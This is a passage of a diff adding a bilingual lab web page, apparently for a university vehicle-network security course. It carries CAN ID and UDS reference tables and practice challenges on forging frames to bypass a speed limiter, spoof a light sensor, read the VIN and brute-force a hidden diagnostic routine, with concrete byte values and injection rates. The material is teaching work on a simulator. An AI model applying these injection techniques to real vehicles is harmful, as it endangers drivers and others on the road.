+                   ││ └─ sub-function: 0x02 = extended session
+                   │└───── SID: 0x10 = DiagnosticSessionControl
+                   └───────── length: 2 bytes follow
+
+<span class="hl-dim"># Positive response: LEN SID+0x40 DATA</span>
+<span class="hl-dim"># 7E8#03 50 02 ...</span>
+<span class="hl-dim">#        └── 0x10 + 0x40 = 0x50 → session confirmed</span></code></pre>
+
+      <h3><span class="en">Positive vs Negative Response</span><span class="fr">Réponse Positive vs Négative</span></h3>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th><span class="en">Type</span><span class="fr">Type</span></th>
+              <th><span class="en">Frame structure</span><span class="fr">Structure de trame</span></th>
+              <th><span class="en">Example</span><span class="fr">Exemple</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><span class="en" style="color:var(--green)">Positive</span><span class="fr"
+                  style="color:var(--green)">Positive</span></td>
+              <td><code>[LEN] [SID+0x40] [data…]</code></td>
+              <td><code>7E8#03 50 02 …</code> <span class="en">(session opened)</span><span class="fr">(session
+                  ouverte)</span></td>
+            </tr>
+            <tr>
+              <td><span class="en" style="color:var(--red)">Negative</span><span class="fr"
+                  style="color:var(--red)">Négative</span></td>
+              <td><code>[0x03] [0x7F] [SID] [NRC]</code></td>
+              <td><code>7E8#03 7F 10 22</code> <span class="en">(conditions not met)</span><span class="fr">(conditions
+                  non remplies)</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Service IDs</span><span class="fr">Identifiants de Service</span>
+      </div>
+      <h2><span class="en">UDS Service Reference</span><span class="fr">Référence des Services UDS</span></h2>
+      <div class="info-block">
+        <div class="info-block-label"><span class="en">Full UDS service table</span><span class="fr">Table complète des
+            services UDS</span></div>
+        <p><span class="en">The <a href="#" onclick="return showPage('reference')">Reference</a> page contains a
+            consolidated UDS service and NRC quick-reference table alongside the CAN ID map.</span>
+          <span class="fr">La page <a href="#" onclick="return showPage('reference')">Référence</a> contient une table
+            de référence rapide consolidée des services UDS et NRC aux côtés de la carte des IDs CAN et de
+            l'aide-mémoire.</span>
+        </p>
+      </div>
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════ PAGE: REFERENCE -->
+  <div class="page" id="page-reference">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Quick Reference</span><span class="fr">Référence Rapide</span></div>
+        <h1><span class="en">FIELD <span class="accent">REFERENCE</span></span><span class="fr"><span
+              class="accent">RÉFÉRENCE</span> TERRAIN</span></h1>
+        <p class="hero-sub">
+          <span class="en">All CAN IDs, decode formulas, command examples, and UDS service codes on one page.</span>
+          <span class="fr">Tous les IDs CAN, formules de décodage, exemples de commandes et codes de services UDS sur
+            une seule page.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content-wide">
+
+      <div class="section-label"><span class="en">Signal Definitions</span><span class="fr">Définitions des
+          Signaux</span></div>
+      <h2><span class="en">CAN ID Map</span><span class="fr">Carte des IDs CAN</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Dec</th>
+              <th><span class="en">Signal</span><span class="fr">Signal</span></th>
+              <th>DLC</th>
+              <th><span class="en">Active byte</span><span class="fr">Octet actif</span></th>
+              <th><span class="en">Encoding</span><span class="fr">Encodage</span></th>
+              <th><span class="en">Period</span><span class="fr">Période</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="amber"><code>0x188</code></td>
+              <td class="dim">392</td>
+              <td><span class="en">Turn / Warning</span><span class="fr">Clignotants / Warning</span></td>
+              <td>1–4</td>
+              <td>[0] bitmask</td>
+              <td>0x01=L 0x02=R 0x03=warn</td>
+              <td>500 ms</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x19B</code></td>
+              <td class="dim">411</td>
+              <td><span class="en">Door locks</span><span class="fr">Verrous portes</span></td>
+              <td>3</td>
+              <td>[2] bitmask</td>
+              <td><span class="en">bit SET=locked</span><span class="fr">bit à 1=verrouillé</span></td>
+              <td class="dim"><span class="en">On action</span><span class="fr">Sur action</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x244</code></td>
+              <td class="dim">580</td>
+              <td><span class="en">Vehicle speed</span><span class="fr">Vitesse véhicule</span></td>
+              <td>5</td>
+              <td>[3] hi [4] lo</td>
+              <td>big-endian, km/h×100</td>
+              <td>~10 ms</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x340</code></td>
+              <td class="dim">832</td>
+              <td><span class="en">Headlights</span><span class="fr">Phares</span></td>
+              <td>8</td>
+              <td>[5] bit 0</td>
+              <td>0=off 1=on</td>
+              <td class="dim"><span class="en">On inject</span><span class="fr">Sur inject</span></td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x39C</code></td>
+              <td class="dim">924</td>
+              <td><span class="en">Luminosity</span><span class="fr">Luminosité</span></td>
+              <td>5</td>
+              <td>[3] value</td>
+              <td><span class="en">≥0x60=day &lt;0x60=night</span><span class="fr">≥0x60=jour &lt;0x60=nuit</span></td>
+              <td>300 ms</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x42A</code></td>
+              <td class="dim">1066</td>
+              <td><span class="en">Warning state</span><span class="fr">État warning</span></td>
+              <td>3–5</td>
+              <td>[2] bit 0</td>
+              <td>0=off 1=on</td>
+              <td>250 ms</td>
+            </tr>
+            <tr>
+              <td><code>0x7E0</code></td>
+              <td class="dim">2016</td>
+              <td><span class="en">UDS request</span><span class="fr">Requête UDS</span></td>
+              <td>var</td>
+              <td>LEN SID DATA</td>
+              <td>ISO 14229</td>
+              <td class="dim"><span class="en">Manual</span><span class="fr">Manuel</span></td>
+            </tr>
+            <tr>
+              <td><code>0x7E8</code></td>
+              <td class="dim">2024</td>
+              <td><span class="en">UDS response</span><span class="fr">Réponse UDS</span></td>
+              <td>var</td>
+              <td>LEN SID+40 DATA</td>
+              <td>ISO 14229</td>
+              <td class="dim"><span class="en">On request</span><span class="fr">Sur requête</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Speed Table</span><span class="fr">Table de Vitesse</span></div>
+      <h2><span class="en">Common Speed Values</span><span class="fr">Valeurs de Vitesse Courantes</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>mph</th>
+              <th>km/h</th>
+              <th>kph_raw</th>
+              <th>data[3]</th>
+              <th>data[4]</th>
+              <th><span class="en">Full frame</span><span class="fr">Trame complète</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="dim"><span class="en">idle</span><span class="fr">arrêt</span></td>
+              <td>0</td>
+              <td class="dim">-</td>
+              <td><code>0x01</code></td>
+              <td class="dim"><span class="en">random</span><span class="fr">aléatoire</span></td>
+              <td><code>00 00 00 01 C2</code></td>
+            </tr>
+            <tr>
+              <td>10</td>
+              <td>16.1</td>
+              <td>1609</td>
+              <td><code>0x06</code></td>
+              <td><code>0x49</code></td>
+              <td><code>00 00 00 06 49</code></td>
+            </tr>
+            <tr>
+              <td>30</td>
+              <td>48.3</td>
+              <td>4828</td>
+              <td><code>0x12</code></td>
+              <td><code>0xDC</code></td>
+              <td><code>00 00 00 12 DC</code></td>
+            </tr>
+            <tr>
+              <td>60</td>
+              <td>96.6</td>
+              <td>9656</td>
+              <td><code>0x25</code></td>
+              <td><code>0xB8</code></td>
+              <td><code>00 00 00 25 B8</code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">limit</span><span class="fr">limite</span></td>
+              <td>100</td>
+              <td>10000</td>
+              <td><code>0x27</code></td>
+              <td><code>0x10</code></td>
+              <td><code>00 00 00 27 10</code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">injected</span><span class="fr">injecté</span></td>
+              <td>150</td>
+              <td>15000</td>
+              <td><code>0x3A</code></td>
+              <td><code>0x98</code></td>
+              <td><code>00 00 00 3A 98</code></td>
+            </tr>
+            <tr>
+              <td class="dim"><span class="en">injected</span><span class="fr">injecté</span></td>
+              <td>200</td>
+              <td>20000</td>
+              <td><code>0x4E</code></td>
+              <td><code>0x20</code></td>
+              <td><code>00 00 00 4E 20</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">UDS Services</span><span class="fr">Services UDS</span></div>
+      <h2 id="ref-uds-service-quick-reference" tabindex="-1"><span class="en">UDS Service Quick-Reference</span><span
+          class="fr">Référence Rapide Services UDS</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>SID</th>
+              <th><span class="en">Service Name</span><span class="fr">Nom du Service</span></th>
+              <th><span class="en">Sub-function / DID</span><span class="fr">Sous-fonction / DID</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="amber"><code>0x10</code></td>
+              <td><span class="en">Diagnostic Session Control</span><span class="fr">Contrôle Session</span></td>
+              <td>0x01 default · 0x02 extended · 0x03 programming</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x11</code></td>
+              <td><span class="en">ECU Reset</span><span class="fr">Reset ECU</span></td>
+              <td>0x01 hard · 0x02 keyOffOn · 0x03 soft</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x22</code></td>
+              <td><span class="en">Read Data By Identifier</span><span class="fr">Lecture par Identifiant</span></td>
+              <td>2-byte DID (e.g. 0xF190 = VIN alt)</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x27</code></td>
+              <td><span class="en">Security Access</span><span class="fr">Accès Sécurisé</span></td>
+              <td>0x01 request seed · 0x02 send key</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x28</code></td>
+              <td><span class="en">Communication Control</span><span class="fr">Contrôle Communication</span></td>
+              <td>0x00 enable Rx+Tx · 0x03 disable Rx</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x31</code></td>
+              <td><span class="en">Routine Control</span><span class="fr">Contrôle de Routine</span></td>
+              <td>0x01 start · 0x02 stop · 0x03 result + 2-byte routine ID</td>
+            </tr>
+            <tr>
+              <td class="amber"><code>0x3E</code></td>
+              <td><span class="en">Tester Present</span><span class="fr">Présence Testeur</span></td>
+              <td>0x00 respond · 0x80 silent</td>
+            </tr>
+            <tr>
+              <td><code>0x09</code></td>
+              <td><span class="en">OBD-II Req. Vehicle Info</span><span class="fr">OBD-II Info Véhicule</span></td>
+              <td>PID 0x02 = VIN (17 chars, multi-frame)</td>
+            </tr>
+            <tr>
+              <td><code>0x7F</code></td>
+              <td><span class="en">Negative Response (ECU → tester)</span><span class="fr">Réponse Négative (ECU →
+                  testeur)</span></td>
+              <td>NRC byte: 0x22 condNotCorrect · 0x35 invalidKey…</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p><span class="en">If you want more details: <a
+            href="https://uds.readthedocs.io/en/stable/pages/knowledge_base/service.html#knowledge-base-service-ecu-reset"
+            target="_blank"
+            rel="noopener">https://uds.readthedocs.io/en/stable/pages/knowledge_base/service.html#knowledge-base-service-ecu-reset</a></span>
+        <span class="fr">Si vous voulez plus de détails : <a
+            href="https://uds.readthedocs.io/en/stable/pages/knowledge_base/service.html#knowledge-base-service-ecu-reset"
+            target="_blank"
+            rel="noopener">https://uds.readthedocs.io/en/stable/pages/knowledge_base/service.html#knowledge-base-service-ecu-reset</a></span>
+      </p>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Negative Response Codes</span><span class="fr">Codes de Réponse
+          Négative</span></div>
+      <h2 id="ref-uds-nrc-reference" tabindex="-1"><span class="en">NRC Reference Table</span><span class="fr">Table
+          de Référence NRC</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>NRC</th>
+              <th><span class="en">Name</span><span class="fr">Nom</span></th>
+              <th><span class="en">Meaning / Common cause</span><span class="fr">Signification / Cause commune</span>
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="nrc-code">0x10</td>
+              <td>generalReject</td>
+              <td><span class="en">Generic rejection with no specific reason</span><span class="fr">Rejet générique sans
+                  raison spécifique</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x11</td>
+              <td>serviceNotSupported</td>
+              <td><span class="en">The SID is not implemented by this ECU</span><span class="fr">Le SID n'est pas
+                  implémenté par cet ECU</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x12</td>
+              <td>subFunctionNotSupported</td>
+              <td><span class="en">Valid SID but unknown sub-function/parameter</span><span class="fr">SID valide mais
+                  sous-fonction/paramètre inconnu</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x13</td>
+              <td>incorrectMessageLength</td>
+              <td><span class="en">Wrong number of bytes in the request</span><span class="fr">Nombre d'octets incorrect
+                  dans la requête</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x22</td>
+              <td>conditionsNotCorrect</td>
+              <td><span class="en">Service requires a specific session you haven't opened</span><span class="fr">Le
+                  service exige une session spécifique que vous n'avez pas ouverte</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x24</td>
+              <td>requestSequenceError</td>
+              <td><span class="en">Steps performed out of order (e.g. key before seed)</span><span class="fr">Étapes
+                  effectuées dans le mauvais ordre (ex : clé avant graine)</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x31</td>
+              <td>requestOutOfRange</td>
+              <td><span class="en">DID or routine ID not recognized</span><span class="fr">DID ou ID de routine non
+                  reconnu</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x33</td>
+              <td>securityAccessDenied</td>
+              <td><span class="en">Security access not yet performed</span><span class="fr">Accès sécurisé pas encore
+                  effectué</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x35</td>
+              <td>invalidKey</td>
+              <td><span class="en">Security Access key is wrong</span><span class="fr">La clé Security Access est
+                  incorrecte</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x36</td>
+              <td>exceededNumberOfAttempts</td>
+              <td><span class="en">Too many wrong keys - ECU locks out temporarily</span><span class="fr">Trop de
+                  mauvaises clés - l'ECU se verrouille temporairement</span></td>
+            </tr>
+            <tr>
+              <td class="nrc-code">0x78</td>
+              <td>requestCorrectlyReceived<br>ResponsePending</td>
+              <td><span class="en">Request accepted, ECU still processing - wait for final response</span><span
+                  class="fr">Requête acceptée, ECU en traitement - attendre la réponse finale</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════ PAGE: TO-DO -->
+  <div class="page" id="page-todo">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Practice Challenges</span><span class="fr">Défis Pratiques</span></div>
+        <h1><span class="en">LAB <span class="accent">TO-DO</span></span><span class="fr">TO-DO <span class="accent">DU LAB</span></span></h1>
+        <p class="hero-sub">
+          <span class="en">Six challenges covering every technique in this lab. Read the objective, study the frame anatomy, and try to solve it yourself. The Solution button is always there if you need it - but resist the urge.</span>
+          <span class="fr">Six défis couvrant toutes les techniques du lab. Lisez l'objectif, étudiez l'anatomie des trames, et essayez de résoudre par vous-même. Le bouton Solution est toujours disponible si nécessaire - mais résistez à la tentation.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+
+      <div class="section-label"><span class="en">All Challenges</span><span class="fr">Tous les Défis</span></div>
+      <div class="challenge-list">
+
+        <!-- ── Challenge 1 ──────────────────────────────────────────────── -->
+        <div class="challenge-section easy">
+          <div class="challenge-header">
+            <div class="challenge-num">01</div>
+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">CAN Injection</span><span class="fr">Injection CAN</span></div>
+              <div class="challenge-title"><span class="en">Blink without keys</span><span class="fr">Clignoter sans touches</span></div>
+            </div>
+            <span class="badge badge-green">Easy</span>
+          </div>
+          <div class="challenge-body">
+            <p>
+              <span class="en">Activate the turn signal blink on the instrument cluster <strong>without</strong> pressing any key in the controls window. Use only terminal commands to forge and inject the correct CAN frame.</span>
+              <span class="fr">Activer le clignotement sur le tableau de bord <strong>sans</strong> appuyer sur une touche dans la fenêtre de contrôle. Utiliser uniquement des commandes terminal pour forger et injecter la bonne trame CAN.</span>
+            </p>
+            <p>
+              <span class="en">The instrument cluster listens to a specific arbitration ID for turn signal commands. You need to identify the correct ID, the relevant byte, and the values that toggle left/right blink on and off.</span>
+              <span class="fr">Le tableau de bord écoute un ID d'arbitrage spécifique pour les commandes de clignotant. Vous devez identifier le bon ID, l'octet concerné, et les valeurs qui activent/désactivent le clignotant gauche/droit.</span>
+            </p>
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">Use <code>candump vcan0</code> while pressing the turn signal key in the controls window. Which arbitration ID changes? What byte position and value?</span>
+              <span class="fr">Utilisez <code>candump vcan0</code> en appuyant sur la touche clignotant dans la fenêtre de contrôle. Quel ID d'arbitrage change ? Quelle position d'octet et valeur ?</span>
+            </div>
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('1')">Solution →</button>
+          </div>
+        </div>
+
+        <!-- ── Challenge 2 ──────────────────────────────────────────────── -->
+        <div class="challenge-section medium">
+          <div class="challenge-header">
+            <div class="challenge-num">02</div>
+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">CAN Injection + Encoding</span><span class="fr">Injection CAN + Encodage</span></div>
+              <div class="challenge-title"><span class="en">Exceed the speed limit</span><span class="fr">Dépasser la limite de vitesse</span></div>
+            </div>
+            <span class="badge badge-amber">Medium</span>
+          </div>
+          <div class="challenge-body">
+            <p>
+              <span class="en">Move the speedometer needle above <strong>100 km/h</strong>. The controls binary enforces a software speed limiter - you must bypass it by injecting forged speed frames at a rate faster than the legitimate sender.</span>
+              <span class="fr">Faire monter l'aiguille du compteur au-dessus de <strong>100 km/h</strong>. Le binaire controls impose un limiteur logiciel - contournez-le en injectant des trames de vitesse forgées à une fréquence plus rapide que l'émetteur légitime.</span>
+            </p>
+            <p>
+              <span class="en">Speed is encoded as a 16-bit big-endian integer: <code>raw = km/h × 100</code>. The two bytes are split across specific positions in the CAN frame data field. Injecting at less than 5 ms interval ensures your frame wins over the legitimate one.</span>
+              <span class="fr">La vitesse est encodée en entier 16 bits big-endian : <code>raw = km/h × 100</code>. Les deux octets sont répartis sur des positions spécifiques dans le champ de données de la trame CAN. Injecter à moins de 5 ms garantit que votre trame l'emporte sur la trame légitime.</span>
+            </p>
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">Encode 150 km/h: <code>150 × 100 = 15000 = 0x3A98</code>. Split big-endian: byte[3]=0x3A, byte[4]=0x98. Inject on the speed arbitration ID at &lt;5 ms.</span>
+              <span class="fr">Encodez 150 km/h : <code>150 × 100 = 15000 = 0x3A98</code>. Split big-endian : byte[3]=0x3A, byte[4]=0x98. Injectez sur l'ID d'arbitrage de vitesse à &lt;5 ms.</span>
+            </div>
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('2')">Solution →</button>
+          </div>
+        </div>
+
+        <!-- ── Challenge 3 ──────────────────────────────────────────────── -->
+        <div class="challenge-section medium">
+          <div class="challenge-header">
+            <div class="challenge-num">03</div>
+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">CAN Injection - Sensor Spoofing</span><span class="fr">Injection CAN - Usurpation de Capteur</span></div>
+              <div class="challenge-title"><span class="en">Defeat the light sensor</span><span class="fr">Tromper le capteur de lumière</span></div>
+            </div>
+            <span class="badge badge-amber">Medium</span>
+          </div>
+          <div class="challenge-body">
+            <p>
+              <span class="en">In night mode, the ambient light sensor triggers automatic headlights. Your goal is to spoof the sensor reading so the ECU believes it is daytime, preventing headlights from activating even when night mode is on.</span>
+              <span class="fr">En mode nuit, le capteur de lumière ambiante déclenche les phares automatiques. Votre objectif est d'usurper la lecture du capteur pour que l'ECU croie qu'il fait jour, empêchant l'activation des phares même en mode nuit.</span>
+            </p>
+            <p>
+              <span class="en">The ECU samples the sensor periodically. If your injected "bright" value arrives more frequently than the real sensor period, it overrides the legitimate reading. The key is both the correct data value <em>and</em> a fast enough injection rate.</span>
+              <span class="fr">L'ECU échantillonne le capteur périodiquement. Si votre valeur "lumineuse" injectée arrive plus fréquemment que la période du capteur réel, elle écrase la lecture légitime. La clé est à la fois la bonne valeur de données <em>et</em> une fréquence d'injection suffisamment rapide.</span>
+            </p>
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">Press <code>s</code> to activate night mode. Inject on ID <code>0x39C</code> with <code>data[3] ≥ 0x60</code> (daytime range) at ≥ 4 Hz (every 200 ms or faster).</span>
+              <span class="fr">Appuyez sur <code>s</code> pour activer le mode nuit. Injectez sur l'ID <code>0x39C</code> avec <code>data[3] ≥ 0x60</code> (plage diurne) à ≥ 4 Hz (toutes les 200 ms ou plus vite).</span>
+            </div>
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('3')">Solution →</button>
+          </div>
+        </div>
+
+        <!-- ── Challenge 4 ──────────────────────────────────────────────── -->
+        <div class="challenge-section medium">
+          <div class="challenge-header">
+            <div class="challenge-num">04</div>
+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">UDS / ISO-TP Diagnostics</span><span class="fr">Diagnostics UDS / ISO-TP</span></div>
+              <div class="challenge-title"><span class="en">Retrieve the VIN</span><span class="fr">Récupérer le VIN</span></div>
+            </div>
+            <span class="badge badge-amber">Medium</span>
+          </div>
+          <div class="challenge-body">
+            <p>
+              <span class="en">Extract the Vehicle Identification Number (17 characters) from the ECU using the OBD-II diagnostic interface. The VIN response exceeds 8 bytes, so it is fragmented across multiple CAN frames using ISO-TP - you must handle the flow control exchange manually.</span>
+              <span class="fr">Extraire le Numéro d'Identification du Véhicule (17 caractères) depuis l'ECU via l'interface diagnostic OBD-II. La réponse VIN dépasse 8 octets, donc elle est fragmentée sur plusieurs trames CAN via ISO-TP - vous devez gérer l'échange de contrôle de flux manuellement.</span>
+            </p>
+            <p>
+              <span class="en">After sending the VIN request, the ECU responds with a <strong>First Frame</strong> containing the total length and the first bytes of the VIN. You must then send a <strong>Flow Control</strong> frame (Continue to Send) to trigger the remaining <strong>Consecutive Frames</strong>.</span>
+              <span class="fr">Après l'envoi de la requête VIN, l'ECU répond avec une <strong>First Frame</strong> contenant la longueur totale et les premiers octets du VIN. Vous devez ensuite envoyer une trame <strong>Flow Control</strong> (Continue to Send) pour déclencher les <strong>Consecutive Frames</strong> restantes.</span>
+            </p>
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">Send <code>02 09 02</code> on <code>0x7E0</code>. Watch for First Frame on <code>0x7E8</code>. Quickly send Flow Control <code>30 00 00</code> to receive the rest.</span>
+              <span class="fr">Envoyez <code>02 09 02</code> sur <code>0x7E0</code>. Attendez la First Frame sur <code>0x7E8</code>. Envoyez rapidement le Flow Control <code>30 00 00</code> pour recevoir la suite.</span>
+            </div>
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('4')">Solution →</button>
+          </div>
+        </div>
+
+        <!-- ── Challenge 5 ──────────────────────────────────────────────── -->
+        <div class="challenge-section hard">
+          <div class="challenge-header">
+            <div class="challenge-num">05</div>
+            <div class="challenge-meta">
+              <div class="challenge-category"><span class="en">UDS Routine Control - Reverse Engineering</span><span class="fr">UDS Routine Control - Rétro-ingénierie</span></div>
+              <div class="challenge-title"><span class="en">Find the hidden routine</span><span class="fr">Trouver la routine cachée</span></div>
+            </div>
+            <span class="badge badge-red">Hard</span>
+          </div>
+          <div class="challenge-body">
+
+            <p>
+              <span class="en">This ECU implements UDS Routine Control (SID <code>0x31</code>) with a <strong>non-standard, undocumented sub-function</strong>. Standard sub-functions are <code>0x01</code> (start), <code>0x02</code> (stop), and <code>0x03</code> (request results) - but there is a hidden fourth one somewhere in the byte range <code>0x00</code>–<code>0x7F</code>.</span>
+              <span class="fr">Cet ECU implémente le UDS Routine Control (SID <code>0x31</code>) avec une <strong>sous-fonction non standard et non documentée</strong>. Les sous-fonctions standard sont <code>0x01</code> (start), <code>0x02</code> (stop) et <code>0x03</code> (request results) - mais il existe une quatrième cachée quelque part dans la plage d'octets <code>0x00</code>–<code>0x7F</code>.</span>
+            </p>
+
+            <p>
+              <span class="en">Each Routine Control request carries <strong>three unknown bytes</strong> beyond the SID: a sub-function <code>XX</code>, a routine ID <code>YY</code>, and an activation byte <code>ZZ</code>. The activation byte controls the state of the routine - valid values are <code>0x00</code> (deactivate) and <code>0x01</code> (activate). You must discover all three independently.</span>
+              <span class="fr">Chaque requête Routine Control porte <strong>trois octets inconnus</strong> au-delà du SID : une sous-fonction <code>XX</code>, un ID de routine <code>YY</code>, et un octet d'activation <code>ZZ</code>. L'octet d'activation contrôle l'état de la routine - les valeurs valides sont <code>0x00</code> (désactiver) et <code>0x01</code> (activer). Vous devez les découvrir indépendamment tous les trois.</span>
+            </p>
+
+            <!-- Frame anatomy -->
+            <div class="frame-anatomy">
+              <div class="frame-anatomy-label"><span class="en">CAN frame anatomy - request</span><span class="fr">Anatomie de la trame CAN - requête</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E0 →</div>
+                <div class="istp-cell istp-len">04<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid">31<br><span style="font-size:0.6rem;opacity:0.7">SID</span></div>
+                <div class="istp-cell istp-unknown">XX<br><span style="font-size:0.6rem;opacity:0.7">Sub-Fn</span></div>
+                <div class="istp-cell istp-unknown">YY<br><span style="font-size:0.6rem;opacity:0.7">Rtn ID</span></div>
+                <div class="istp-cell istp-act">ZZ<br><span style="font-size:0.6rem;opacity:0.7">Act.</span></div>
+              </div>
+              <div class="frame-anatomy-label" style="margin-top:1rem"><span class="en">ECU positive response</span><span class="fr">Réponse positive ECU</span></div>
+              <div class="istp-row">
+                <div class="istp-label">7E8 →</div>
+                <div class="istp-cell istp-len">04<br><span style="font-size:0.6rem;opacity:0.7">LEN</span></div>
+                <div class="istp-cell istp-sid" style="border-color:var(--green);color:var(--green);background:rgba(56,168,120,0.07)">71<br><span style="font-size:0.6rem;opacity:0.7">+RSP</span></div>
+                <div class="istp-cell istp-unknown">XX<br><span style="font-size:0.6rem;opacity:0.7">Echo</span></div>
+                <div class="istp-cell istp-unknown">YY<br><span style="font-size:0.6rem;opacity:0.7">Echo</span></div>
+                <div class="istp-cell istp-act">ZZ<br><span style="font-size:0.6rem;opacity:0.7">Echo</span></div>
+              </div>
+              <div class="istp-legend">
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--cyan)"></div><span class="en">SID - fixed (0x31 request / 0x71 response)</span><span class="fr">SID - fixe (0x31 requête / 0x71 réponse)</span></div>
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--red)"></div><span class="en">XX YY - unknown, must be discovered by enumeration</span><span class="fr">XX YY - inconnus, à découvrir par énumération</span></div>
+                <div class="istp-legend-item"><div class="istp-legend-dot" style="background:var(--green)"></div><span class="en">ZZ - activation byte: 0x01 = on, 0x00 = off</span><span class="fr">ZZ - octet d'activation : 0x01 = activer, 0x00 = désactiver</span></div>
+              </div>
+            </div>
+
+            <p>
+              <span class="en">There are <strong>two valid</strong> <code>(XX, YY)</code> pairs, each accepting <code>ZZ = 0x01</code> and <code>ZZ = 0x00</code>. Finding one triggers a visible change on the instrument cluster. The ECU will echo back <code>XX YY ZZ</code> in its <code>0x71</code> positive response - use this to verify your result.</span>
+              <span class="fr">Il existe <strong>deux paires</strong> <code>(XX, YY)</code> valides, chacune acceptant <code>ZZ = 0x01</code> et <code>ZZ = 0x00</code>. En trouver une déclenche un changement visible sur le tableau de bord. L'ECU renvoie <code>XX YY ZZ</code> dans sa réponse positive <code>0x71</code> - utilisez ceci pour valider votre résultat.</span>
+            </p>
+
+            <p>
+              <span class="en"><strong>Important:</strong> this routine is only accessible in the <strong>extended diagnostic session</strong>. You must open it before enumerating, and keep it alive with TesterPresent while you scan - the session times out if it receives no traffic for more than one second.</span>
+              <span class="fr"><strong>Important :</strong> cette routine n'est accessible qu'en <strong>session de diagnostic étendue</strong>. Vous devez l'ouvrir avant d'énumérer, et la maintenir en vie avec TesterPresent pendant le scan - la session expire si elle ne reçoit aucun trafic pendant plus d'une seconde.</span>
+            </p>
+
+            <div class="challenge-hint">
+              <strong>Hint</strong>
+              <span class="en">Brute-forcing manually with <code>cansend</code> is impractical - 256 × 256 combinations with no synchronization. Think about writing a script that opens an ISO-TP socket (kernel-level request/response pairing), keeps the session alive in a background thread, and sweeps <code>XX</code> then <code>YY</code> systematically. What NRC codes can you use to filter out dead combinations early?</span>
+              <span class="fr">Le brute-force manuel avec <code>cansend</code> est impraticable - 256 × 256 combinaisons sans synchronisation. Pensez à écrire un script qui ouvre un socket ISO-TP (couplage requête/réponse au niveau noyau), maintient la session en vie dans un thread en arrière-plan, et balaye <code>XX</code> puis <code>YY</code> systématiquement. Quels codes NRC pouvez-vous utiliser pour filtrer les combinaisons mortes tôt ?</span>
+            </div>
+
+          </div>
+          <div class="challenge-footer">
+            <button class="sol-btn" onclick="showSolution('5')">Solution →</button>
+          </div>
+        </div>
+
+        <!-- ── Challenge 6 ──────────────────────────────────────────────── -->
+        <div class="challenge-section hard">
+          <div class="challenge-header">
+            <div class="challenge-num">06</div>
